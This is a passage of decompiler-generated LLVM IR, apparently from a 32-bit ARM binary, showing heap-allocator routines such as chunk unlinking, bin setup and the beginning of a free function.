  %v2_16c5c = inttoptr i32 %v1_16c5c to i32*
  %v3_16c5c = load i32, i32* %v2_16c5c, align 4
  store i32 %v3_16c5c, i32* %sl.global-to-local, align 4
  %v1_16c60 = add i32 %v2_16c54, 4
  %v2_16c60 = inttoptr i32 %v1_16c60 to i32*
  %v3_16c60 = load i32, i32* %v2_16c60, align 4
  store i32 %v3_16c60, i32* %r8.global-to-local, align 4
  br i1 %v2_16c58, label %dec_label_pc_16c68, label %dec_label_pc_16c9c

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c4c
  %v1_16c68 = inttoptr i32 %v0_16c68 to i32*
  %v2_16c68 = load i32, i32* %v1_16c68, align 4
  store i32 %v2_16c68, i32* %r5.global-to-local, align 4
  %v2_16c6c = sub i32 %v0_16c68, %v2_16c68
  store i32 %v2_16c6c, i32* %r3.global-to-local, align 4
  %v1_16c70 = add i32 %v2_16c6c, 8
  %v2_16c70 = inttoptr i32 %v1_16c70 to i32*
  %v3_16c70 = load i32, i32* %v2_16c70, align 4
  store i32 %v3_16c70, i32* @ip, align 4
  %v1_16c74 = add i32 %v3_16c70, 12
  %v2_16c74 = inttoptr i32 %v1_16c74 to i32*
  %v3_16c74 = load i32, i32* %v2_16c74, align 4
  store i32 %v3_16c74, i32* %r1.global-to-local, align 4
  %v9_16c78 = icmp eq i32 %v3_16c74, %v2_16c6c
  %v1_16c7c = add i32 %v2_16c6c, 12
  %v2_16c7c = inttoptr i32 %v1_16c7c to i32*
  %v3_16c7c = load i32, i32* %v2_16c7c, align 4
  store i32 %v3_16c7c, i32* %r2.global-to-local, align 4
  br i1 %v9_16c78, label %dec_label_pc_16c84, label %dec_label_pc_16ce0

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c68
  %v1_16c84 = add i32 %v3_16c7c, 8
  %v2_16c84 = inttoptr i32 %v1_16c84 to i32*
  %v3_16c84 = load i32, i32* %v2_16c84, align 4
  store i32 %v3_16c84, i32* %r3.global-to-local, align 4
  %v9_16c88 = icmp eq i32 %v3_16c84, %v2_16c6c
  br i1 %v9_16c88, label %dec_label_pc_16c90, label %dec_label_pc_16ce0

dec_label_pc_16c90:                               ; preds = %dec_label_pc_16c84
  store i32 %v3_16c70, i32* %v2_16c84, align 4
  %v0_16c94 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c94 = load i32, i32* @ip, align 4
  %v2_16c94 = add i32 %v1_16c94, 12
  %v3_16c94 = inttoptr i32 %v2_16c94 to i32*
  store i32 %v0_16c94, i32* %v3_16c94, align 4
  %v0_16c98 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c98 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c98 = add i32 %v1_16c98, %v0_16c98
  store i32 %v2_16c98, i32* %lr.global-to-local, align 4
  %v0_16ca0.pre = load i32, i32* @r0, align 4
  %v0_16ca4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16c9c

dec_label_pc_16c9c:                               ; preds = %dec_label_pc_16c4c, %dec_label_pc_16c90
  %v0_16d14 = phi i32 [ %v1_16c50, %dec_label_pc_16c4c ], [ %v2_16c98, %dec_label_pc_16c90 ]
  %v0_16ca4 = phi i32 [ %v3_16c60, %dec_label_pc_16c4c ], [ %v0_16ca4.pre, %dec_label_pc_16c90 ]
  %v1_16cb8 = phi i32 [ %v2_16c54, %dec_label_pc_16c4c ], [ %v0_16ca0.pre, %dec_label_pc_16c90 ]
  %v0_16c9c = load i32, i32* @r4, align 4
  %v1_16c9c = add i32 %v0_16c9c, 44
  %v2_16c9c = inttoptr i32 %v1_16c9c to i32*
  %v3_16c9c = load i32, i32* %v2_16c9c, align 4
  store i32 %v3_16c9c, i32* %r3.global-to-local, align 4
  %v9_16ca0 = icmp eq i32 %v1_16cb8, %v3_16c9c
  %v1_16ca4 = and i32 %v0_16ca4, -4
  store i32 %v1_16ca4, i32* %r5.global-to-local, align 4
  br i1 %v9_16ca0, label %dec_label_pc_16d14, label %dec_label_pc_16cac

dec_label_pc_16cac:                               ; preds = %dec_label_pc_16c9c
  %v2_16cac = add i32 %v1_16cb8, %v1_16ca4
  store i32 %v2_16cac, i32* %r3.global-to-local, align 4
  %v1_16cb0 = add i32 %v2_16cac, 4
  %v2_16cb0 = inttoptr i32 %v1_16cb0 to i32*
  %v3_16cb0 = load i32, i32* %v2_16cb0, align 4
  store i32 %v3_16cb0, i32* %r3.global-to-local, align 4
  %v1_16cb4 = urem i32 %v3_16cb0, 2
  %v2_16cb4 = icmp eq i32 %v1_16cb4, 0
  %v2_16cb8 = add i32 %v1_16cb8, 4
  %v3_16cb8 = inttoptr i32 %v2_16cb8 to i32*
  store i32 %v1_16ca4, i32* %v3_16cb8, align 4
  br i1 %v2_16cb4, label %dec_label_pc_16cc0, label %dec_label_pc_16cac.dec_label_pc_16cf0_crit_edge

dec_label_pc_16cac.dec_label_pc_16cf0_crit_edge:  ; preds = %dec_label_pc_16cac
  %v0_16cf4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16cf0

dec_label_pc_16cc0:                               ; preds = %dec_label_pc_16cac
  %v0_16cc0 = load i32, i32* @r0, align 4
  %v1_16cc0 = add i32 %v0_16cc0, 8
  %v2_16cc0 = inttoptr i32 %v1_16cc0 to i32*
  %v3_16cc0 = load i32, i32* %v2_16cc0, align 4
  store i32 %v3_16cc0, i32* @ip, align 4
  %v1_16cc4 = add i32 %v3_16cc0, 12
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i32*
  %v3_16cc4 = load i32, i32* %v2_16cc4, align 4
  store i32 %v3_16cc4, i32* %r3.global-to-local, align 4
  %v9_16cc8 = icmp eq i32 %v3_16cc4, %v0_16cc0
  %v1_16ccc = add i32 %v0_16cc0, 12
  %v2_16ccc = inttoptr i32 %v1_16ccc to i32*
  %v3_16ccc = load i32, i32* %v2_16ccc, align 4
  store i32 %v3_16ccc, i32* %r2.global-to-local, align 4
  br i1 %v9_16cc8, label %dec_label_pc_16cd4, label %dec_label_pc_16ce0

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16cc0
  %v1_16cd4 = add i32 %v3_16ccc, 8
  %v2_16cd4 = inttoptr i32 %v1_16cd4 to i32*
  %v3_16cd4 = load i32, i32* %v2_16cd4, align 4
  store i32 %v3_16cd4, i32* %r3.global-to-local, align 4
  %v9_16cd8 = icmp eq i32 %v3_16cd4, %v0_16cc0
  br i1 %v9_16cd8, label %dec_label_pc_16ce4, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cc0, %dec_label_pc_16c84, %dec_label_pc_16c68, %dec_label_pc_16cd4
  %v0_16ce0 = call i32 @abort()
  store i32 %v0_16ce0, i32* @r0, align 4
  %v0_16ce4.pre = load i32, i32* @ip, align 4
  %v1_16ce4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16ce4

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cd4, %dec_label_pc_16ce0
  %v1_16ce4 = phi i32 [ %v3_16ccc, %dec_label_pc_16cd4 ], [ %v1_16ce4.pre, %dec_label_pc_16ce0 ]
  %v0_16ce4 = phi i32 [ %v3_16cc0, %dec_label_pc_16cd4 ], [ %v0_16ce4.pre, %dec_label_pc_16ce0 ]
  %v2_16ce4 = add i32 %v1_16ce4, 8
  %v3_16ce4 = inttoptr i32 %v2_16ce4 to i32*
  store i32 %v0_16ce4, i32* %v3_16ce4, align 4
  %v0_16ce8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ce8 = load i32, i32* @ip, align 4
  %v2_16ce8 = add i32 %v1_16ce8, 12
  %v3_16ce8 = inttoptr i32 %v2_16ce8 to i32*
  store i32 %v0_16ce8, i32* %v3_16ce8, align 4
  %v0_16cec = load i32, i32* %lr.global-to-local, align 4
  %v1_16cec = load i32, i32* %r5.global-to-local, align 4
  %v2_16cec = add i32 %v1_16cec, %v0_16cec
  store i32 %v2_16cec, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16cf0

dec_label_pc_16cf0:                               ; preds = %dec_label_pc_16cac.dec_label_pc_16cf0_crit_edge, %dec_label_pc_16ce4
  %v0_16cf4 = phi i32 [ %v0_16cf4.pre, %dec_label_pc_16cac.dec_label_pc_16cf0_crit_edge ], [ %v2_16cec, %dec_label_pc_16ce4 ]
  %v0_16cf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_16cf0 = add i32 %v0_16cf0, 8
  %v2_16cf0 = inttoptr i32 %v1_16cf0 to i32*
  %v3_16cf0 = load i32, i32* %v2_16cf0, align 4
  store i32 %v3_16cf0, i32* %r2.global-to-local, align 4
  %v1_16cf4 = or i32 %v0_16cf4, 1
  store i32 %v1_16cf4, i32* %r3.global-to-local, align 4
  %v0_16cf8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16cf8, i32* %v2_16cf0, align 4
  %v0_16cfc = load i32, i32* %r1.global-to-local, align 4
  %v1_16cfc = load i32, i32* %r2.global-to-local, align 4
  %v2_16cfc = add i32 %v1_16cfc, 12
  %v3_16cfc = inttoptr i32 %v2_16cfc to i32*
  store i32 %v0_16cfc, i32* %v3_16cfc, align 4
  %v0_16d00 = load i32, i32* %lr.global-to-local, align 4
  %v1_16d00 = load i32, i32* %r1.global-to-local, align 4
  %v3_16d00 = add i32 %v1_16d00, %v0_16d00
  %v4_16d00 = inttoptr i32 %v3_16d00 to i32*
  store i32 %v0_16d00, i32* %v4_16d00, align 4
  %v0_16d04 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d04 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d04 = add i32 %v1_16d04, 4
  %v3_16d04 = inttoptr i32 %v2_16d04 to i32*
  store i32 %v0_16d04, i32* %v3_16d04, align 4
  %v0_16d08 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d08 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d08 = add i32 %v1_16d08, 8
  %v3_16d08 = inttoptr i32 %v2_16d08 to i32*
  store i32 %v0_16d08, i32* %v3_16d08, align 4
  %v0_16d0c = load i32, i32* %r7.global-to-local, align 4
  %v1_16d0c = load i32, i32* %r1.global-to-local, align 4
  %v2_16d0c = add i32 %v1_16d0c, 12
  %v3_16d0c = inttoptr i32 %v2_16d0c to i32*
  store i32 %v0_16d0c, i32* %v3_16d0c, align 4
  br label %dec_label_pc_16d24

dec_label_pc_16d14:                               ; preds = %dec_label_pc_16c9c
  %v2_16d14 = add i32 %v1_16ca4, %v0_16d14
  %v1_16d18 = or i32 %v2_16d14, 1
  store i32 %v1_16d18, i32* %r3.global-to-local, align 4
  %v1_16d1c = load i32, i32* %r1.global-to-local, align 4
  %v2_16d1c = add i32 %v1_16d1c, 4
  %v3_16d1c = inttoptr i32 %v2_16d1c to i32*
  store i32 %v1_16d18, i32* %v3_16d1c, align 4
  %v0_16d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d20 = load i32, i32* @r4, align 4
  %v2_16d20 = add i32 %v1_16d20, 44
  %v3_16d20 = inttoptr i32 %v2_16d20 to i32*
  store i32 %v0_16d20, i32* %v3_16d20, align 4
  br label %dec_label_pc_16d24

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16cf0, %dec_label_pc_16d14
  %v0_16d24 = load i32, i32* %sl.global-to-local, align 4
  %v2_16d24 = icmp eq i32 %v0_16d24, 0
  store i32 %v0_16d24, i32* %r1.global-to-local, align 4
  br i1 %v2_16d24, label %dec_label_pc_16d30.loopexit, label %dec_label_pc_16c4c

dec_label_pc_16d30.loopexit:                      ; preds = %dec_label_pc_16d24
  %v0_16d30.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_16d30.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d30.loopexit, %dec_label_pc_16c3c
  %v1_16d30 = phi i32 [ %v1_16d30.pre, %dec_label_pc_16d30.loopexit ], [ %v1_16d3011, %dec_label_pc_16c3c ]
  %v0_16d38 = phi i32 [ %v0_16d30.pre, %dec_label_pc_16d30.loopexit ], [ %v1_16c48, %dec_label_pc_16c3c ]
  %v9_16d30 = icmp eq i32 %v0_16d38, %v1_16d30
  br i1 %v9_16d30, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_16d30
  %v3_16d34 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_16d34, i32* @r4, align 4
  %v30_16d34 = load i32, i32* @r0, align 4
  ret i32 %v30_16d34

bb24:                                             ; preds = %dec_label_pc_16d30
  %v1_16d38 = add i32 %v0_16d38, 4
  store i32 %v1_16d38, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16c3c

dec_label_pc_16d40.dec_label_pc_16d40_crit_edge:  ; preds = %dec_label_pc_16d40.preheader, %dec_label_pc_16d40.dec_label_pc_16d40_crit_edge
  %v0_16d40.pre = load i32, i32* @r4, align 4
  %v1_16d40.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_16d40 = mul i32 %v1_16d40.pre, 8
  %v5_16d40 = add i32 %v4_16d40, %v0_16d40.pre
  %v1_16d44 = add i32 %v1_16d40.pre, 1
  store i32 %v1_16d44, i32* %r2.global-to-local, align 4
  %v1_16d48 = add i32 %v5_16d40, 44
  store i32 %v1_16d48, i32* %r3.global-to-local, align 4
  %v2_16d50 = add i32 %v5_16d40, 52
  %v3_16d50 = inttoptr i32 %v2_16d50 to i32*
  store i32 %v1_16d48, i32* %v3_16d50, align 4
  %v0_16d54 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d54 = add i32 %v0_16d54, 12
  %v3_16d54 = inttoptr i32 %v2_16d54 to i32*
  store i32 %v0_16d54, i32* %v3_16d54, align 4
  %v7_16d58 = icmp sgt i32 %v1_16d44, 95
  br i1 %v7_16d58, label %dec_label_pc_16d5c, label %dec_label_pc_16d40.dec_label_pc_16d40_crit_edge

dec_label_pc_16d5c:                               ; preds = %dec_label_pc_16d40.dec_label_pc_16d40_crit_edge
  %v0_16d5c = load i32, i32* @r4, align 4
  %v1_16d5c = inttoptr i32 %v0_16d5c to i32*
  %v2_16d5c = load i32, i32* %v1_16d5c, align 4
  store i32 %v2_16d5c, i32* %r2.global-to-local, align 4
  %v1_16d60 = add i32 %v0_16d5c, 864
  %v2_16d60 = inttoptr i32 %v1_16d60 to i32*
  %v3_16d60 = load i32, i32* %v2_16d60, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16d68 = urem i32 %v2_16d5c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_16d70 = or i32 %v3_16d60, 1
  store i32 %v1_16d70, i32* %r1.global-to-local, align 4
  %v1_16d74 = or i32 %v1_16d68, 72
  store i32 %v1_16d74, i32* %r2.global-to-local, align 4
  %v1_16d78 = add i32 %v0_16d5c, 52
  store i32 %v1_16d78, i32* @ip, align 4
  %v2_16d7c = add i32 %v0_16d5c, 840
  %v3_16d7c = inttoptr i32 %v2_16d7c to i32*
  store i32 0, i32* %v3_16d7c, align 4
  %v0_16d80 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d80 = add i32 %v0_16d80, 65536
  store i32 %v1_16d80, i32* %r3.global-to-local, align 4
  %v0_16d84 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d84 = load i32, i32* @r4, align 4
  %v2_16d84 = add i32 %v1_16d84, 836
  %v3_16d84 = inttoptr i32 %v2_16d84 to i32*
  store i32 %v0_16d84, i32* %v3_16d84, align 4
  %v0_16d88 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d88 = load i32, i32* @r4, align 4
  %v2_16d88 = add i32 %v1_16d88, 844
  %v3_16d88 = inttoptr i32 %v2_16d88 to i32*
  store i32 %v0_16d88, i32* %v3_16d88, align 4
  %v1_16d8c = load i32, i32* @r4, align 4
  %v2_16d8c = add i32 %v1_16d8c, 852
  %v3_16d8c = inttoptr i32 %v2_16d8c to i32*
  store i32 %v1_16d80, i32* %v3_16d8c, align 4
  %v1_16d90 = load i32, i32* @r4, align 4
  %v2_16d90 = add i32 %v1_16d90, 864
  %v3_16d90 = inttoptr i32 %v2_16d90 to i32*
  store i32 %v1_16d70, i32* %v3_16d90, align 4
  %v1_16d94 = load i32, i32* @r4, align 4
  %v2_16d94 = inttoptr i32 %v1_16d94 to i32*
  store i32 %v1_16d74, i32* %v2_16d94, align 4
  %v0_16d98 = load i32, i32* @ip, align 4
  %v1_16d98 = load i32, i32* @r4, align 4
  %v2_16d98 = add i32 %v1_16d98, 44
  %v3_16d98 = inttoptr i32 %v2_16d98 to i32*
  store i32 %v0_16d98, i32* %v3_16d98, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_16da0 = call i32 @sysconf(i32 30, i32 %v1_16d70, i32 %v1_16d74, i32 %v1_16d80)
  store i32 %v4_16da0, i32* %r0.global-to-local, align 4
  %v1_16da4 = load i32, i32* @r4, align 4
  %v2_16da4 = add i32 %v1_16da4, 860
  %v3_16da4 = inttoptr i32 %v2_16da4 to i32*
  store i32 %v4_16da0, i32* %v3_16da4, align 4
  %v2_16da8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16da8, i32* @r4, align 4
  ret i32 %v4_16da0

; uselistorder directives
  uselistorder i32 %v0_16d5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16d54, { 1, 0 }
  uselistorder i32 %v1_16d38, { 1, 0 }
  uselistorder i32 %v0_16d24, { 0, 2, 1 }
  uselistorder i32 %v0_16d00, { 1, 0 }
  uselistorder i32 %v1_16c50, { 1, 0, 2 }
  uselistorder i32 %v0_16c68, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_16c28, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_16d40.dec_label_pc_16d40_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16d24, { 1, 0 }
  uselistorder label %dec_label_pc_16cf0, { 1, 0 }
  uselistorder label %dec_label_pc_16ce4, { 1, 0 }
  uselistorder label %dec_label_pc_16ce0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16c9c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16dac = load i32, i32* @r4, align 4
  %v6_16dac = load i32, i32* @r5, align 4
  %v9_16dac = load i32, i32* @r6, align 4
  %v12_16dac = load i32, i32* @r7, align 4
  %v0_16db0 = load i32, i32* @r0, align 4
  store i32 %v0_16db0, i32* @r6, align 4
  %v2_16db0 = icmp eq i32 %v0_16db0, 0
  %v2_16db4 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v2_16db0, label %dec_label_pc_16f8c, label %dec_label_pc_16dbc

dec_label_pc_16dbc:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* @r2, align 4
  store i32 %v2_16db4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 98440, i32* %r3.global-to-local, align 4
  store i32 93652, i32* %lr.global-to-local, align 4
  %v1_16dd0 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* %r0.global-to-local, align 4
  store i32 93672, i32* %lr.global-to-local, align 4
  %v2_16de4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e330.1421 to i32))
  store i32 %v2_16de4, i32* %r0.global-to-local, align 4
  %v0_16de8 = load i32, i32* @r6, align 4
  %v1_16de8 = add i32 %v0_16de8, -4
  %v2_16de8 = inttoptr i32 %v1_16de8 to i32*
  %v3_16de8 = load i32, i32* %v2_16de8, align 4
  store i32 %v3_16de8, i32* %r2.global-to-local, align 4
  %v2_16dec = load i32, i32* @global_var_3471c.1425, align 4
  store i32 %v2_16dec, i32* %r3.global-to-local, align 4
  %v1_16df0 = and i32 %v3_16de8, -4
  store i32 %v1_16df0, i32* @ip, align 4
  %v1_16df4 = add i32 %v0_16de8, -8
  store i32 %v1_16df4, i32* @r4, align 4
  store i32 %v1_16df4, i32* %lr.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_16df0, %v2_16dec
  br i1 %tmp, label %dec_label_pc_16e24, label %dec_label_pc_16e04

dec_label_pc_16e04:                               ; preds = %dec_label_pc_16dbc
  store i32 ptrtoint (i32* @global_var_34718.1427 to i32), i32* %r0.global-to-local, align 4
  %v3_16e08 = udiv i32 %v3_16de8, 8
  store i32 %v3_16e08, i32* %r1.global-to-local, align 4
  %v4_16e0c = mul nuw i32 %v3_16e08, 4
  %v5_16e0c = add i32 %v4_16e0c, ptrtoint (i32* @global_var_34718.1427 to i32)
  %v6_16e0c = inttoptr i32 %v5_16e0c to i32*
  %v7_16e0c = load i32, i32* %v6_16e0c, align 4
  store i32 %v7_16e0c, i32* @r2, align 4
  %v1_16e10 = or i32 %v2_16dec, 3
  store i32 %v1_16e10, i32* %r3.global-to-local, align 4
  %v3_16e14 = inttoptr i32 %v0_16de8 to i32*
  store i32 %v7_16e0c, i32* %v3_16e14, align 4
  %v0_16e18 = load i32, i32* %r3.global-to-local, align 4
  %v1_16e18 = load i32, i32* @r5, align 4
  %v2_16e18 = inttoptr i32 %v1_16e18 to i32*
  store i32 %v0_16e18, i32* %v2_16e18, align 4
  %v0_16e1c = load i32, i32* @r4, align 4
  %v1_16e1c = load i32, i32* %r0.global-to-local, align 4
  %v2_16e1c = load i32, i32* %r1.global-to-local, align 4
  %v5_16e1c = mul i32 %v2_16e1c, 4
  %v6_16e1c = add i32 %v5_16e1c, %v1_16e1c
  %v7_16e1c = inttoptr i32 %v6_16e1c to i32*
  store i32 %v0_16e1c, i32* %v7_16e1c, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16e24:                               ; preds = %dec_label_pc_16dbc
  %v1_16e24 = and i32 %v3_16de8, 2
  %v2_16e24 = icmp eq i32 %v1_16e24, 0
  br i1 %v2_16e24, label %dec_label_pc_16e2c, label %dec_label_pc_16f50

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e24
  %v1_16e2c = or i32 %v2_16dec, 1
  store i32 %v1_16e2c, i32* %r3.global-to-local, align 4
  %v1_16e30 = load i32, i32* @r5, align 4
  %v2_16e30 = inttoptr i32 %v1_16e30 to i32*
  store i32 %v1_16e2c, i32* %v2_16e30, align 4
  %v0_16e34 = load i32, i32* @r6, align 4
  %v1_16e34 = add i32 %v0_16e34, -4
  %v2_16e34 = inttoptr i32 %v1_16e34 to i32*
  %v3_16e34 = load i32, i32* %v2_16e34, align 4
  store i32 %v3_16e34, i32* %r3.global-to-local, align 4
  %v0_16e38 = load i32, i32* @r4, align 4
  %v1_16e38 = load i32, i32* @ip, align 4
  %v2_16e38 = add i32 %v1_16e38, %v0_16e38
  store i32 %v2_16e38, i32* %r1.global-to-local, align 4
  %v1_16e3c = urem i32 %v3_16e34, 2
  %v2_16e3c = icmp eq i32 %v1_16e3c, 0
  %v1_16e40 = add i32 %v2_16e38, 4
  %v2_16e40 = inttoptr i32 %v1_16e40 to i32*
  %v3_16e40 = load i32, i32* %v2_16e40, align 4
  store i32 %v3_16e40, i32* @r7, align 4
  br i1 %v2_16e3c, label %dec_label_pc_16e48, label %dec_label_pc_16e7c

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e2c
  %v1_16e48 = add i32 %v0_16e34, -8
  %v2_16e48 = inttoptr i32 %v1_16e48 to i32*
  %v3_16e48 = load i32, i32* %v2_16e48, align 4
  store i32 %v3_16e48, i32* @r5, align 4
  %v2_16e4c = sub i32 %v0_16e38, %v3_16e48
  store i32 %v2_16e4c, i32* %r3.global-to-local, align 4
  %v1_16e50 = add i32 %v2_16e4c, 8
  %v2_16e50 = inttoptr i32 %v1_16e50 to i32*
  %v3_16e50 = load i32, i32* %v2_16e50, align 4
  store i32 %v3_16e50, i32* %r2.global-to-local, align 4
  %v1_16e54 = add i32 %v3_16e50, 12
  %v2_16e54 = inttoptr i32 %v1_16e54 to i32*
  %v3_16e54 = load i32, i32* %v2_16e54, align 4
  store i32 %v3_16e54, i32* %lr.global-to-local, align 4
  %v9_16e58 = icmp eq i32 %v3_16e54, %v2_16e4c
  %v1_16e5c = add i32 %v2_16e4c, 12
  %v2_16e5c = inttoptr i32 %v1_16e5c to i32*
  %v3_16e5c = load i32, i32* %v2_16e5c, align 4
  store i32 %v3_16e5c, i32* %r0.global-to-local, align 4
  br i1 %v9_16e58, label %dec_label_pc_16e64, label %dec_label_pc_16ec4

dec_label_pc_16e64:                               ; preds = %dec_label_pc_16e48
  %v1_16e64 = add i32 %v3_16e5c, 8
  %v2_16e64 = inttoptr i32 %v1_16e64 to i32*
  %v3_16e64 = load i32, i32* %v2_16e64, align 4
  store i32 %v3_16e64, i32* %r3.global-to-local, align 4
  %v9_16e68 = icmp eq i32 %v3_16e64, %v2_16e4c
  br i1 %v9_16e68, label %dec_label_pc_16e70, label %dec_label_pc_16ec4

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e64
  store i32 %v3_16e50, i32* %v2_16e64, align 4
  %v0_16e74 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e74 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e74 = add i32 %v1_16e74, 12
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  store i32 %v0_16e74, i32* %v3_16e74, align 4
  %v0_16e78 = load i32, i32* @ip, align 4
  %v1_16e78 = load i32, i32* @r5, align 4
  %v2_16e78 = add i32 %v1_16e78, %v0_16e78
  store i32 %v2_16e78, i32* @ip, align 4
  %v0_16e84.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_16e88.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e2c, %dec_label_pc_16e70
  %v0_16efc = phi i32 [ %v1_16e38, %dec_label_pc_16e2c ], [ %v2_16e78, %dec_label_pc_16e70 ]
  %v0_16e88 = phi i32 [ %v3_16e40, %dec_label_pc_16e2c ], [ %v0_16e88.pre, %dec_label_pc_16e70 ]
  %v1_16e9c = phi i32 [ %v2_16e38, %dec_label_pc_16e2c ], [ %v0_16e84.pre, %dec_label_pc_16e70 ]
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r2, align 4
  %v3_16e80 = load i32, i32* @global_var_34748.1431, align 4
  store i32 %v3_16e80, i32* %r3.global-to-local, align 4
  %v9_16e84 = icmp eq i32 %v1_16e9c, %v3_16e80
  %v1_16e88 = and i32 %v0_16e88, -4
  store i32 %v1_16e88, i32* %r4.global-to-local, align 4
  br i1 %v9_16e84, label %dec_label_pc_16efc, label %dec_label_pc_16e90

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16e7c
  %v2_16e90 = add i32 %v1_16e9c, %v1_16e88
  store i32 %v2_16e90, i32* %r3.global-to-local, align 4
  %v1_16e94 = add i32 %v2_16e90, 4
  %v2_16e94 = inttoptr i32 %v1_16e94 to i32*
  %v3_16e94 = load i32, i32* %v2_16e94, align 4
  store i32 %v3_16e94, i32* %r3.global-to-local, align 4
  %v1_16e98 = urem i32 %v3_16e94, 2
  %v2_16e98 = icmp eq i32 %v1_16e98, 0
  %v2_16e9c = add i32 %v1_16e9c, 4
  %v3_16e9c = inttoptr i32 %v2_16e9c to i32*
  store i32 %v1_16e88, i32* %v3_16e9c, align 4
  br i1 %v2_16e98, label %dec_label_pc_16ea4, label %dec_label_pc_16e90.dec_label_pc_16ed4_crit_edge

dec_label_pc_16e90.dec_label_pc_16ed4_crit_edge:  ; preds = %dec_label_pc_16e90
  %v0_16edc.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_16ed4

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e90
  %v0_16ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea4 = add i32 %v0_16ea4, 8
  %v2_16ea4 = inttoptr i32 %v1_16ea4 to i32*
  %v3_16ea4 = load i32, i32* %v2_16ea4, align 4
  store i32 %v3_16ea4, i32* %r0.global-to-local, align 4
  %v1_16ea8 = add i32 %v3_16ea4, 12
  %v2_16ea8 = inttoptr i32 %v1_16ea8 to i32*
  %v3_16ea8 = load i32, i32* %v2_16ea8, align 4
  store i32 %v3_16ea8, i32* %r3.global-to-local, align 4
  %v9_16eac = icmp eq i32 %v3_16ea8, %v0_16ea4
  %v1_16eb0 = add i32 %v0_16ea4, 12
  %v2_16eb0 = inttoptr i32 %v1_16eb0 to i32*
  %v3_16eb0 = load i32, i32* %v2_16eb0, align 4
  store i32 %v3_16eb0, i32* %r2.global-to-local, align 4
  br i1 %v9_16eac, label %dec_label_pc_16eb8, label %dec_label_pc_16ec4

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16ea4
